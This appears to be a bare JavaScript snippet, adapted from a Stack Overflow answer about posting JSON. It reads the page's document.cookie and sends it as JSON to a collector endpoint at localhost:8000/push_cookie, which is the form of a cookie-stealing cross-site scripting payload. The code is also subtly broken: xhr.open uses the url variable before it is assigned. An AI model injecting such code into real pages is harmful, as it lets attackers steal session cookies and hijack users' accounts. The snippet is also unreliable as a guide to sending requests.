// Sending and receiving data in JSON format using POST method
// https://stackoverflow.com/questions/24468459/sending-a-json-to-server-and-retrieving-a-json-in-return-without-jquery

var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var json = JSON.parse(xhr.responseText);
        console.log(json);
    }
};

// Get cookie data
var x = document.cookie;
var data = JSON.stringify({'cookie': x});

// Set URL 
var url = "http://localhost:8000/push_cookie";

// Send cookie data
xhr.send(data);